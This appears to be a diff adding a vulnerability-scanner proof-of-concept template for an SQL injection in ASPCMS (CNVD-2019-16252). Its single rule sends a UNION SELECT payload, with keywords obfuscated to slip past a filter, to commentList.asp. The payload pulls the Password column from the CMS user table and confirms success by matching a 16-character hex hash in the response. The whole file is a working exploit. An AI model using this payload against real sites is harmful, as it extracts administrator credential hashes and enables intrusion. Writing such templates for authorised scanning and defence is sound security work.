@@ -1,0 +1,21 @@
+name: yaml-poc-aspcms-aspcms-sql_injection-CNVD-2019-16252
+binding: 8a6acc45-f002-4bcb-b1f1-18c434d118c8
+detail:
+    author: system_user
+    links:
+        - https://www.cnvd.org.cn/flaw/show/CNVD-2019-16252
+    vulnerability:
+        id: cd064700-6046-4c4f-94d3-5d8da20d4a7a
+        level: high
+transport: http
+set:
+    rand: randomInt(-200000, -100000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20null,null,abs({{rand}}),Password,1,null,1%20%20frmasterom%20{prefix}user
+        expression: |
+            response.status == 200 && response.body.bcontains(bytes(string(-rand) + " IP")) && "<div class=\"line2\">[0-9a-f]{16}</div>".bmatches(response.body)
+expression: r0()
